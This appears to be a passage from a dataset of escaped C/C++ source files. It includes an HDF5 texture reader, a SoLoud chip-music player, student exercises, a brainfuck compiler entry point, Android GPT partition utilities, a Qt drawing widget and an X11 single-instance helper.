cout<<endl;\n\n    buildFromLevelOrder(root);\n    cout<<\"The level order traversal is: \" <<endl; \n    levelordertraversal(root); \n    // cout<<endl;\n    return 0; \n}\n",
    "#include \"HDF5Texture.hpp\"\n\n#include <highfive/boost.hpp>\n#include <highfive/highfive.hpp>\nnamespace DataReader\n{\nvoid HDF5_TextureReader::operator()()\n{\n  if(!dataset->isValid())\n    return;\n\n  if(dataset_dims.size() != 4)\n    return;\n  if(dataset_dims[3] != 3)\n    return;\n\n  int n_frames = dataset_dims[0];\n  int height = dataset_dims[1];\n  int width = dataset_dims[2];\n\n  if(width != outputs.image.texture.width || height != outputs.image.texture.height)\n    bytes = outputs.image.texture.allocate(width, height);\n\n  int frame = std::clamp(this->inputs.percent * (n_frames - 1.), 0., n_frames - 1.);\n  thread_local boost::multi_array<double, 4> result;\n  dataset->select({(unsigned)frame, 0, 0, 0}, {1, (unsigned)height, (unsigned)width, 3})\n      .read(result);\n\n  int sp = 0;\n  const auto& img = result[0];\n  for(int y = 0; y < height; y++)\n  {\n    const auto& row = img[y];\n    for(int x = 0; x < width; x++)\n    {\n      const auto& col = row[x];\n      for(int c = 0; c < 3; c++)\n        bytes[sp++] = 255 * col[c];\n      bytes[sp++] = 255;\n    }\n  }\n  outputs.image.texture.update(bytes.data(), width, height);\n}\n}\n",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <memory.h>\n#include \"chipplayer.h\"\n#include \"soloud_file.h\"\n#include \"soloud_ay.h\"\n\nChipPlayer::ChipPlayer(SoLoud::AyInstance *aInstance)\n\t: buffer(8192), chip(buffer), chip2(buffer), mInstance(aInstance)\n{\n\tplaytick = 0;\n\tplaypos = 0;\n\tsystem_clock_rate = 0;\n\tticks_per_buffer = 0;\n\n\t//set_timings(SNDR_DEFAULT_SYSTICK_RATE * 40 / 17, SNDR_DEFAULT_AY_RATE * 20 / 17, SNDR_DEFAULT_SAMPLE_RATE);\n\tset_timings(aInstance->mParent->mCpuspeed, aInstance->mParent->mChipspeed, SNDR_DEFAULT_SAMPLE_RATE);\n\t//set_volumes(SNDCHIP::CHIP_YM, 0x7FFF, SNDR_VOL_YM, SNDR_PAN_ABC);\n\tif (aInstance->mParent->mYm)\n\t\tset_volumes(SNDCHIP::CHIP_YM, 0x7FFF, SNDR_VOL_YM, SNDR_PAN_ABC);\n\telse\n\t\tset_volumes(SNDCHIP::CHIP_AY, 0x7FFF, SNDR_VOL_AY, SNDR_PAN_ABC);\n}\n\nChipPlayer::~ChipPlayer()\n{\n}\n\nunsigned ChipPlayer::get_time(unsigned tick)\n{\n\treturn (unsigned)((tick * 1000) / system_clock_rate);\n}\n\n\n\n\nvoid ChipPlayer::set_timings(unsigned aSystem_clock_rate, unsigned chip_clock_rate, unsigned sample_rate)\n{\n\tChipPlayer::system_clock_rate = aSystem_clock_rate;\n\tticks_per_buffer = (unsigned)((long long)system_clock_rate * (buffer.size - 20) / sample_rate);\n\tticks_per_buffer /= 2; // for safety\n\tchip.set_timings(system_clock_rate, chip_clock_rate, sample_rate);\n\tchip2.set_timings(system_clock_rate, chip_clock_rate, sample_rate);\n\tplaytick = 0; playpos = 0;\n\tbuffer.reset();\n}\n\nconst int VOL_DIV = 2; // mixer just adds samples. to avoid overflow, we lower volume then revert back with saturation\n\nvoid ChipPlayer::set_volumes(SNDCHIP::CHIP_TYPE t, unsigned global_vol, const SNDCHIP_VOLTAB *vt, const SNDCHIP_PANTAB *pt)\n{\n\tchip.set_chip(t);\n\tchip.set_volumes(global_vol / VOL_DIV, vt, pt);\n\tchip2.set_chip(t);\n\tchip2.set_volumes(global_vol / VOL_DIV, vt, pt);\n}\n\ninline int _min(int a, int b) { return (a < b) ? a : b; }\n\nunsigned ChipPlayer::play(float *dst, unsigned need_samples)\n{\n\tunsigned stride = need_samples;\n\twhile (need_samples)\n\t{\n\t\t// read from buffer\n\t\tbuffer.count_start();\n\t\tbuffer.count(chip);\n\t\tbuffer.count(chip2);\n\t\tunsigned ready = buffer.count_end();\n\t\tunsigned from_buffer = _min(ready, need_samples);\n\n\t\tfor (unsigned i = 0; i < from_buffer; i++)\n\t\t{\n\t\t\t// normalize (volume divided by 4)\n\t\t\tSNDSAMPLE& s = buffer.buffer[(buffer.read_position + i) & (buffer.size - 1)];\n\t\t\t//*dst++ = s;\n\t\t\tint l = VOL_DIV * (int)s.ch.left;\n\t\t\t//if (l > 0x7FFF) l = 0x7FFF;\n\t\t\t//if (l < -0x7FFF) l = -0x7FFF;\n\t\t\tint r = VOL_DIV * (int)s.ch.right;\n\t\t\t//if (r > 0x7FFF) r = 0x7FFF;\n\t\t\t//if (r < -0x7FFF) r = -0x7FFF;\n\t\t\t*dst = l / (float)0x7fff;\n\t\t\t*(dst + stride) = r / (float)0x7fff;\n\t\t\tdst++;\n\t\t}\n\t\tbuffer.samples_read(from_buffer);\n\n\t\tneed_samples -= from_buffer;\n\t\tif (!need_samples) return stride;\n\n\t\tif (mInstance->mPos >= mInstance->mParent->mLength)\n\t\t\treturn stride - need_samples;\n\n\t\t// render to buffer\n\t\tchip.start_frame();\n\t\tchip2.start_frame();\n\n\t\tunsigned frame_tick = playtick;\n\t\twhile ((unsigned)(playtick - frame_tick) < ticks_per_buffer)\n\t\t{\n\n\t\t\tunsigned short rd;\n\t\t\tdo\n\t\t\t{\n\t\t\t\trd = mInstance->mParent->mOps[mInstance->mPos/2];\n\t\t\t\tmInstance->mPos += 2;\n\t\t\t\tif (rd & 0x8000)\n\t\t\t\t{\n\t\t\t\t\tplaytick += rd ^ 0x8000;\n\t\t\t\t}\n\t\t\t} while ((rd & 0x8000) && !(mInstance->mPos >= mInstance->mParent->mLength));\n\t\t\t\n\t\t\tif (mInstance->mPos >= mInstance->mParent->mLength)\n\t\t\t\tbreak;\n\n\t\t\tunsigned char reg = rd >> 8;\n\t\t\tunsigned char val = rd & 0xff;\n\n\t\t\tunsigned ts = (unsigned)(playtick - frame_tick);\n\t\t\tif (reg & 0x10) {\n\t\t\t\tchip2.select(reg & 0x0F);\n\t\t\t\tchip2.write(ts, val);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tchip.select(reg);\n\t\t\t\tchip.write(ts, val);\n\t\t\t}\n\t\t}\n\t\tchip.end_frame((unsigned)(playtick - frame_tick));\n\t\tchip2.end_frame((unsigned)(playtick - frame_tick));\n\t}\n\treturn stride;\n}\n",
    "#include <iostream>\n#include <ctime>\n\nusing namespace std;\n\nint main() {\n\tsrand(time(0));\n\t/*const int length = 10;\n\tint arr[length]{};*/\n\n\n\t// fill array\n\t/*for (size_t i = 0; i < length;)\n\t\t{\n\t\t\tint number = rand() % 10 + 1;\n\t\t\tbool flag = true;\n\n\t\t\tfor (size_t j = 0; j < i; j++)\n\t\t\t{\n\t\t\t\tif (arr[j] == number) {\n\t\t\t\t\tflag = false;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (flag) {\n\t\t\t\tarr[i] = number;\n\t\t\t\ti++;\n\t\t\t}\n\t\t}\n\n\t\tcout << \"Print array: \";\n\t\tfor (size_t i = 0; i < length; i++)\n\t\t{\n\t\t\tcout << arr[i] << \"\\t \";\n\t\t}\n\t\tcout << endl;*/\n\n\n\t//sorted array\n\t/*for (size_t j = 0; j < length - 1; j++)\n\t\t{\n\t\t\tbool flag = true;\n\t\t\tfor (size_t i = 0; i < length - 1 - j; i++)\n\t\t\t{\n\t\t\t\tif (arr[i] > arr[i + 1]) {\n\t\t\t\t\tint temp = arr[i];\n\t\t\t\t\tarr[i] = arr[i + 1];\n\t\t\t\t\tarr[i + 1] = temp;\n\t\t\t\t\tflag = false;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (flag)\n\t\t\t\tbreak;\n\n\t\t}\n\n\n\n\t\tcout << \"Sorted array: \";\n\t\tfor (size_t i = 0; i < length; i++)\n\t\t{\n\t\t\tcout << arr[i] << \"\\t\";\n\t\t}*/\n\n\t// reverse sorted array\n\t/*for (size_t j = 0; j < length - 1; j++)\n\t\t{\n\t\t\tbool flag = true;\n\t\t\t\tfor (size_t i = 0; i < length - 1 - j; i++)\n\t\t\t{\n\t\t\t\tif (arr[i] < arr[i + 1]) {\n\t\t\t\t\tint temp = arr[i];\n\t\t\t\t\tarr[i] = arr[i + 1];\n\t\t\t\t\tarr[i + 1] = temp;\n\t\t\t\t\tflag = false;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (flag)\n\t\t\t\tbreak;\n\t\t}\n\n\n\n\t\tcout << \"Sorted array: \";\n\t\tfor (size_t i = 0; i < length; i++)\n\t\t{\n\t\t\tcout << arr[i] << \"\\t\";\n\t\t}*/\n\n\t/*for (size_t i = 0; i < length;)\n\t\t\t{\n\t\t\t\tint number = rand() % 10 + 1;\n\t\t\t\tbool flag = true;\n\n\t\t\t\tfor (size_t j = 0; j < i; j++)\n\t\t\t\t{\n\t\t\t\t\tif (arr[j] == number) {\n\t\t\t\t\t\tflag = false;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tif (flag) {\n\t\t\t\t\tarr[i] = number;\n\t\t\t\t\ti++;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tcout << \"Print array: \";\n\t\t\tfor (size_t i = 0; i < length; i++)\n\t\t\t{\n\t\t\t\tcout << arr[i] << \"\\t \";\n\t\t\t}\n\t\t\tcout << endl;\n\n\t\t\tfor (size_t i = 1; i < length; i++)\n\t\t\t{\n\t\t\t\tint key = arr[i];\n\t\t\t\tint j = i - 1;\n\t\t\t\twhile (j >= 0 and key < arr[j])\n\t\t\t\t{\n\t\t\t\t\tarr[j + 1] = arr[j];\n\t\t\t\t\tj--;\n\t\t\t\t}\n\t\t\t\tarr[j + 1] = key;\n\n\t\t\t}\n\t\t\tcout << \"Print array: \";\n\t\t\tfor (size_t i = 0; i < length; i++)\n\t\t\t{\n\t\t\t\tcout << arr[i] << \"\\t \";\n\t\t\t}\n\t\t\tcout << endl;\n\t\t}*/\n\n\tconst int N = 10;\n\tint marks[N];\n\tint index, newMark;\n\tdouble sum = 0;\n\tint choice = 0;\n\n\tcout << \"Enter marks: \" << endl;\n\tfor (int i = 0; i < N; i++)\n\t{\n\t\tdo\n\t\t{\n\t\t\tcout << \"Mark \" << i + 1 << \": \";\n\t\t\tcin >> marks[i];\n\t\t} while (marks[i] < 1 || marks[i] > 12);\n\t}\n\n\tdo\n\t{\n\t\tcout << \"\\nMenu:\\n\";\n\t\tcout << \"1. Marks\\n\";\n\t\tcout << \"2. Retake the exam\\n\";\n\t\tcout << \"3. Scholarship\\n\";\n\t\tcout << \"Choice: \";\n\t\tcin >> choice;\n\n\t\tif (choice == 1)\n\t\t{\n\t\t\tcout << \"Marks: \";\n\t\t\tfor (int i = 0; i < N; i++)\n\t\t\t{\n\t\t\t\tcout << marks[i] << \" \";\n\t\t\t}\n\t\t\tcout << endl;\n\t\t}\n\n\t\telse if (choice == 2)\n\t\t{\n\t\t\tdo\n\t\t\t{\n\t\t\t\tcout << \"Enter mark you want to change: \";\n\t\t\t\tcin >> index;\n\t\t\t} while (index < 1 || index > 10);\n\n\t\t\tdo\n\t\t\t{\n\t\t\t\tcout << \"Enter new mark: \";\n\t\t\t\tcin >> newMark;\n\t\t\t} while (newMark < 1 || newMark > 12);\n\n\t\t\tmarks[index - 1] = newMark;\n\t\t\tcout << \"Mark changed\" << endl;\n\n\t\t}\n\t\telse if (choice == 3)\n\t\t{\n\t\t\tsum = 0;\n\t\t\tfor (int i = 0; i < N; i++)\n\t\t\t{\n\t\t\t\tsum += marks[i];\n\t\t\t}\n\n\t\t\tdouble average = sum / N;\n\t\t\tcout << \"Average: \" << average << endl;\n\n\t\t\tif (average >= 10.7) {\n\t\t\t\tcout << \"Scholarship\" << endl;\n\t\t\t}\n\n\t\t}while (choice != 4);\n\t}\n\n\n\n\t/*cout << \"\\n\\n\\n\";\n\tconst int size = 5, size2 = 10;\n\tint one[size]{}, two[size]{}, res[size2]{};\n\n\tint min = -10, max = 10;\n\tfor (size_t i = 0; i < size; i++)\n\t{\n\t\tone[i] = rand() % (max - min + 1) + min;\n\t\ttwo[i] = rand() % (max - min + 1) + min;\n\t}\n\tcout << \"First array  :: \";\n\tfor (size_t i = 0; i < size; i++)\n\t{\n\t\tcout << one[i] << \"\\t\";\n\t}cout << endl;\n\n\tcout << \"Second array :: \";\n\tfor (size_t i = 0; i < size; i++)\n\t{\n\t\tcout << two[i] << \"\\t\";\n\t}cout << endl;\n\n\tint j = 0;\n\tfor (size_t i = 0; i < size; i++)\n\t{\n\t\tif (one[i] > 0)\n\t\t\tres[j++] = one[i];\n\n\t\tif (two[i] > 0)\n\t\t\tres[j++] = two[i];\n\t}\n\n\tfor (size_t i = 0; i < size; i++)\n\t{\n\t\tif (one[i] == 0)\n\t\t\tres[j++] = one[i];\n\t\tif (two[i] == 0)\n\t\t\tres[j++] = two[i];\n\t}\n\n\tfor (size_t i = 0; i < size; i++)\n\t{\n\t\tif (one[i] < 0)\n\t\t\tres[j++] = one[i];\n\t\tif (two[i] < 0)\n\t\t\tres[j++] = two[i];\n\t}\n\tcout << \"Result array :: \";\n\tfor (size_t i = 0; i < j; i++)\n\t{\n\t\tcout << res[i] << \"\\t\";\n\t}cout << endl;*/\n\n\n}",
    "// hello.cpp by Bill Weinman [bw.org]\n// updated 2022-05-19\n\n#include <cstdint>\n#include <string>\n#include <vector>\n\n#include <iostream>\n#include <sstream>\n#include <fstream>\n\n#include <format>\n\nusing std::cin;\nusing std::cout;\nusing std::string;\nusing std::stringstream;\nusing std::vector;\n\nusing std::format;\n\ntemplate <typename T>\nvoid printVector(vector<T> *v)\n{\n    cout << format(\"{:-^50} \\n\", \"vector\");\n    for (auto it = v->begin(); it < v->end(); ++it)\n    {\n        cout << format(\"{} \\n\", *it);\n    }\n};\n\ntemplate <typename T>\nstruct Frac\n{\n    T n;\n    T d;\n};\n\ntemplate <typename T>\n\nstruct std::formatter<Frac<T>> : std::formatter<unsigned>\n{\n    template <typename C>\n    auto format(const Frac<T> &frazione, C &contesto) const\n    {\n        return format_to(contesto.out(), \"{:^6}\\n-------\\n {:^6}\\n\", frazione.n, frazione.d);\n    }\n};\n\nstruct Item\n{\n    long sku;\n    std::string name;\n    std::string description;\n};\n\nvector<string> split(string line, char delimiter)\n{\n    long pos{0};\n    long endpos{0};\n\n    vector<string> splitted{};\n\n    while (pos < sizeof(line))\n    {\n        endpos = line.find(\"\\t\", pos);\n        if (endpos == -1)\n        {\n            splitted.push_back(line.substr(pos, sizeof(line) - pos));\n            break;\n        }\n        splitted.push_back(line.substr(pos, endpos - pos));\n        pos = endpos + 1;\n    }\n\n    return splitted;\n}\n\nvector<string> split2(string line, char delimiter)\n{\n    stringstream ss(line);\n\n    vector<string> splitted{};\n\n    char chunk[128]{};\n\n    while (ss.getline(chunk, sizeof(chunk), '\\t'))\n    {\n        splitted.push_back(chunk);\n    }\n\n    return splitted;\n}\n\nvoid getfile(const char filename[])\n{\n    std::ifstream infile(filename);\n    char data[128];\n    std::string line;\n\n    std::string inp{};\n    while (infile.good())\n    {\n\n        infile.getline(data, sizeof(data));\n\n        line = data;\n        cout << line << \"\\n\";\n\n        vector<string> splitted = split(line, '\\t');\n\n        Item it{\n            std::stoi(splitted[0]), splitted[1], splitted[2]};\n        cout << \"sku ....: \" << it.sku << \"\\n\";\n        cout << \"name ...: \" << it.name << \"\\n\";\n        cout << \"descr ..: \" << it.description << \"\\n\";\n    }\n};\n\nint main()\n\n{\n\n    getfile(\"./data/items.txt\");\n\n    return 0;\n}\n",
    "#include <fstream>\n#include <iostream>\n#include <sstream>\n#include \"utils.hpp\"\n#include \"lexer.hpp\"\n#include \"ir.hpp\"\n\nusing namespace std;\n\n/*\n  The language consists of eight commands. A brainfuck program is a sequence of these commands,\n  possibly interspersed with other characters (which are ignored). The commands are executed\n  sequentially, with some exceptions : an instruction pointer begins at the first command, and each\n  command it points to is executed, after which it normally moves forward to the next command. The\n  program terminates when the instruction pointer moves past the last command.\n\n  The brainfuck language uses a simple machine model consisting of :\n\n    (1) the program and instruction pointer\n\n    (2) a one-dimensional array of at least 30,000 byte cells initialized to zero\n\n    (3) a movable data pointer (initialized to point to the leftmost byte of the array)\n\n    (4) two streams of bytes for input and output (most often connected to a keyboard and a monitor\n        respectively, and using the ASCII character encoding).\n*/\n\nint main(int argc, char* argv[]) {\n  if(argc != 2) {\n    cerr << \"Wrong number of command-line arguments\" << endl;\n    cerr << \"Usage : jit-compiler-brainfuck <input.bf>\" << endl;\n    exit(1);\n  }\n\n  const char* inputFilePath = argv[1];\n  const string &inputFileContents = readFile(inputFilePath);\n\n  auto lexer = new Lexer(inputFileContents);\n\n  auto irGenerator = new IRsGenerator(lexer);\n  auto irs = irGenerator->generate();\n\n  return 0;\n}\n",
    "/*\n * Copyright (c) 2013,2016,2020 The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n\n#define _LARGEFILE64_SOURCE /* enable lseek64() */\n\n/******************************************************************************\n * INCLUDE SECTION\n ******************************************************************************/\n#include <stdio.h>\n#include <fcntl.h>\n#include <string.h>\n#include <errno.h>\n#include <sys/stat.h>\n#include <sys/ioctl.h>\n#include <unistd.h>\n#include <linux/fs.h>\n#include <limits.h>\n#include <dirent.h>\n#include <linux/kernel.h>\n#include <asm/byteorder.h>\n#include <map>\n#include <vector>\n#include <string>\n#ifndef __STDC_FORMAT_MACROS\n#define __STDC_FORMAT_MACROS\n#endif\n#include <inttypes.h>\n\n\n#define LOG_TAG \"gpt-utils\"\n#include <cutils/log.h>\n#include <cutils/properties.h>\n#include \"gpt-utils.h\"\n#include <zlib.h>\n#include <endian.h>\n\n\n/******************************************************************************\n * DEFINE SECTION\n ******************************************************************************/\n#define BLK_DEV_FILE    \"/dev/block/mmcblk0\"\n/* list the names of the backed-up partitions to be swapped */\n/* extension used for the backup partitions - tzbak, abootbak, etc. */\n#define BAK_PTN_NAME_EXT    \"bak\"\n#define XBL_PRIMARY         \"/dev/block/bootdevice/by-name/xbl\"\n#define XBL_BACKUP          \"/dev/block/bootdevice/by-name/xblbak\"\n#define XBL_AB_PRIMARY      \"/dev/block/bootdevice/by-name/xbl_a\"\n#define XBL_AB_SECONDARY    \"/dev/block/bootdevice/by-name/xbl_b\"\n/* GPT defines */\n#define MAX_LUNS                    26\n//This will allow us to get the root lun path from the path to the partition.\n//i.e: from /dev/block/sdaXXX get /dev/block/sda. The assumption here is that\n//the boot critical luns lie between sda to sdz which is acceptable because\n//only user added external disks,etc would lie beyond that limit which do not\n//contain partitions that interest us here.\n#define PATH_TRUNCATE_LOC (sizeof(\"/dev/block/sda\") - 1)\n\n//From /dev/block/sda get just sda\n#define LUN_NAME_START_LOC (sizeof(\"/dev/block/\") - 1)\n#define BOOT_LUN_A_ID 1\n#define BOOT_LUN_B_ID 2\n/******************************************************************************\n * MACROS\n ******************************************************************************/\n\n\n#define GET_4_BYTES(ptr)    ((uint32_t) *((uint8_t *)(ptr)) | \\\n        ((uint32_t) *((uint8_t *)(ptr) + 1) << 8) | \\\n        ((uint32_t) *((uint8_t *)(ptr) + 2) << 16) | \\\n        ((uint32_t) *((uint8_t *)(ptr) + 3) << 24))\n\n#define GET_8_BYTES(ptr)    ((uint64_t) *((uint8_t *)(ptr)) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 1) << 8) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 2) << 16) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 3) << 24) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 4) << 32) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 5) << 40) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 6) << 48) | \\\n        ((uint64_t) *((uint8_t *)(ptr) + 7) << 56))\n\n#define PUT_4_BYTES(ptr, y)   *((uint8_t *)(ptr)) = (y) & 0xff; \\\n        *((uint8_t *)(ptr) + 1) = ((y) >> 8) & 0xff; \\\n        *((uint8_t *)(ptr) + 2) = ((y) >> 16) & 0xff; \\\n        *((uint8_t *)(ptr) + 3) = ((y) >> 24) & 0xff;\n\n/******************************************************************************\n * TYPES\n ******************************************************************************/\nusing namespace std;\nenum gpt_state {\n    GPT_OK = 0,\n    GPT_BAD_SIGNATURE,\n    GPT_BAD_CRC\n};\n//List of LUN's c",
    "#include \"myscribbler.h\"\n#include <QtWidgets>\n\nMouseEvent::MouseEvent(int _action, QPointF _pos, quint64 _time, double _distance)\n    : action(_action), pos(_pos), time(_time), distance(_distance) { }\n\nMouseEvent::MouseEvent() { }\n\nMouseEvent::MouseEvent(const MouseEvent &me) {\n    *this = me;\n}\n\nQDataStream &operator<<(QDataStream &out, const MouseEvent &evt) {\n    return out << evt.action << evt.pos << evt.time << evt.distance;\n}\n\nQDataStream &operator>>(QDataStream &in, MouseEvent &evt) {\n    return in >> evt.action >> evt.pos >> evt.time >> evt.distance;\n}\n\n// -----------------------------------------------------------------\n\nmyScribbler::myScribbler() : lineWidth(4.0), showLines(true) {\n    setScene(&scene);\n    setSceneRect(QRectF(0.0, 0.0, 800.0, 600.0));\n    setMinimumSize(QSize(800, 600));\n    setRenderHint(QPainter::Antialiasing, true);\n\n    scene.addRect(sceneRect());\n    capture = false;\n}\n\nvoid myScribbler::mouseMoveEvent(QMouseEvent *evt) {\n\n    QPointF p = mapToScene(evt->pos());\n    double distance = std::hypot(p.x() - lastPoint.x(), p.y() - lastPoint.y());\n\n    QGraphicsLineItem* lineItem = scene.addLine(QLineF(lastPoint, p),\n                                                QPen(Qt::darkGreen, lineWidth, Qt::SolidLine, Qt::FlatCap));\n    lineItem->setVisible(showLines);\n    lines.append(lineItem);\n\n    QGraphicsEllipseItem* dotItem = scene.addEllipse(\n        QRectF(p - QPointF(0.5 * lineWidth, 0.5 * lineWidth),\n               QSizeF(lineWidth, lineWidth)), Qt::NoPen, Qt::darkGreen);\n    dots.append(dotItem);\n\n    lastPoint = p;\n    MouseEvent me(MouseEvent::Move, p, QDateTime::currentMSecsSinceEpoch(), distance);\n\n    // Store items if capturing\n    if (capture) {\n        capturedEvents.append(me);\n        currentCaptureItems.append(lineItem);\n        currentCaptureItems.append(dotItem);\n    }\n}\n\nvoid myScribbler::mousePressEvent(QMouseEvent *evt) {\n\n    QPointF p = mapToScene(evt->pos());\n    lastPoint = p;\n\n    QGraphicsEllipseItem* dotItem = scene.addEllipse(\n        QRectF(p - QPointF(0.5 * lineWidth, 0.5 * lineWidth),\n               QSizeF(lineWidth, lineWidth)), Qt::NoPen, Qt::darkGreen);\n    dots.append(dotItem);\n\n    MouseEvent me(MouseEvent::Press, p, QDateTime::currentMSecsSinceEpoch(), 0);\n\n    // Store items if capturing\n    if (capture) {\n        capturedEvents.append(me);\n        currentCaptureItems.append(dotItem);\n    }\n}\n\nvoid myScribbler::mouseReleaseEvent(QMouseEvent *evt) {\n\n    QPointF p = mapToScene(evt->pos());\n\n    MouseEvent me(MouseEvent::Release, p, QDateTime::currentMSecsSinceEpoch(), 0);\n\n    if (capture) {\n        capturedEvents.append(me);\n    }\n}\n\nvoid myScribbler::resetDrawing() {\n\n    scene.clear();\n    scene.addRect(sceneRect());\n    lines.clear();\n    dots.clear();\n    captures.clear();\n    currentCaptureItems.clear();\n    allEvents.clear();\n\n    dotCaptureIndices.clear();\n    lineCaptureIndices.clear();\n}\n\nvoid myScribbler::startCapture() {\n    capture = true;\n    capturedEvents.clear();\n    currentCaptureItems.clear();\n\n    dotCaptureIndices.append(dots.size());\n    lineCaptureIndices.append(lines.size());\n}\n\nvoid myScribbler::endCapture() {\n    // Group current capture items\n    QGraphicsItemGroup* group = new QGraphicsItemGroup();\n    for (QGraphicsItem* item : currentCaptureItems) {\n        group->addToGroup(item);\n    }\n    scene.addItem(group);\n    captures.append(group);\n    currentCaptureItems.clear();\n\n    // Store the captured events\n    allEvents.append(capturedEvents);\n\n    emit emitMySignal(capturedEvents, true);\n    capture = false;\n    capturedEvents.clear();\n}\n\nvoid myScribbler::lineSegments() {\n\n    showLines = true;\n    for (QGraphicsLineItem* line : lines) {\n        line->setVisible(true);\n    }\n}\n\nvoid myScribbler::dotsOnly() {\n\n    showLines = false;\n    for (QGraphicsLineItem* line : lines) {\n        line->setVisible(false);\n    }\n}\n\nvoid myScribbler::setCaptureOpacity(int captureIndex, double opacity) {\n\n    for (int i = 0; i < captures.size(); ++i) {\n        if (i != captureIndex) {\n            captures[i]->setOpacity(opacity);\n        } else {\n            captures[i]->setOpacity(1);\n        }\n    }\n}\n\nvoid myScribbler::highlightEvents(int captureIndex, const QList<int> &eventIndices) {\n\n    resetHighlighting(captureIndex);\n\n    if (captureIndex < 0 || captureIndex >= captures.size())\n        return;\n\n    int dotStartIndex = dotCaptureIndices[captureIndex];\n    int dotEndIndex = (captureIndex + 1 < dotCaptureIndices.size()) ? dotCaptureIndices[captureIndex + 1] : dots.size();\n\n    int lineStartIndex = lineCaptureIndices[captureIndex];\n    int lineEndIndex = (captureIndex + 1 < lineCaptureIndices.size()) ? lineCaptureIndices[captureIndex + 1] : lines.size();\n\n    for (int index : eventIndices) {\n        int dotIndex = dotStartIndex + index;\n        int lineIndex = lineStartIndex + index;\n\n        if (dotIndex >= dotStartIndex && dotIndex < dotEndIndex) {\n            QGraphicsEllipseItem* dot = dots[dotIndex];\n            dot->setBr",
    "/*\n *\n * \u00a9K. D. Hedger. Thu 17 Oct 14:13:11 BST 2024 keithdhedger@gmail.com\n\n * This file (SingleInstanceClass.cpp) is part of KKTerminalQT.\n\n * KKTerminalQT is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n\n * KKTerminalQT is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n   GNU General Public License for more details.\n\n * You should have received a copy of the GNU General Public License\n * along with KKTerminalQT.  If not, see <http://www.gnu.org/licenses/>.\n*/\n\n#include \"globals.h\"\n\nvoid* SingleInstanceClass::getX11Prop(Display\t*display,Window w,Atom prop,Atom type,int fmt,unsigned long *rcountp)\n{\n\tvoid\t\t\t\t*ptr=NULL;\n\tunsigned long\tcount=32;\n\tAtom\t\t\t\trtype;\n\tint\t\t\t\trfmt;\n\tunsigned long\trafter;\n\n\tfor (;;)\n\t\t{\n\t\t\tif (XGetWindowProperty(display,w,prop,0L,count,False,type,&rtype,&rfmt,rcountp,&rafter,(unsigned char **)&ptr) != Success)\n\t\t\t\treturn NULL;\n\t\t\telse if (rtype != type || rfmt != fmt)\n\t\t\t\treturn NULL;\n\t\t\telse if (rafter>0)\n\t\t\t\t{\n\t\t\t\t\tXFree(ptr);\n\t\t\t\t\tptr=NULL;\n\t\t\t\t\tcount *= 2;\n\t\t\t\t}\n\t\t\telse\n\t\t\t\treturn ptr;\n\t\t}\n\treturn(NULL);\n}\n\nlong SingleInstanceClass::getSIWorkSpace(Display *display)\n{\n\tif(display!=NULL)\n\t\t{\n\t\t\tunsigned long\trootwin=DefaultRootWindow(display);\n\t\t\tunsigned long\tn=0;\n\t\t\tAtom\t\t\t\tNET_WM_DESKTOP;\n\t\t\tlong\t\t\t\t*deskp;\n\n\t\t\tNET_WM_DESKTOP=XInternAtom(display,\"_NET_CURRENT_DESKTOP\",False);\n\t\t\tdeskp=(long*)getX11Prop(display,rootwin,NET_WM_DESKTOP,XA_CARDINAL,32,&n);\n\t\t\tif (n !=0)\n\t\t\t\t{\n\t\t\t\t\tlong retval=*deskp;\n\t\t\t\t\tXFree(deskp);\n\t\t\t\t\treturn(retval);\n\t\t\t\t}\n\t\t}\n\treturn(-1);\n}\n\nunsigned long SingleInstanceClass::hashFromKey(QString key)\n{\n\tunsigned long hash=0;\n\n\tfor(int i=0;i<key.length();i++)\n\t\thash=31*hash+key.at(i).toLatin1();\n\n\treturn(hash);\n}\n\nSingleInstanceClass::SingleInstanceClass(QString name,int 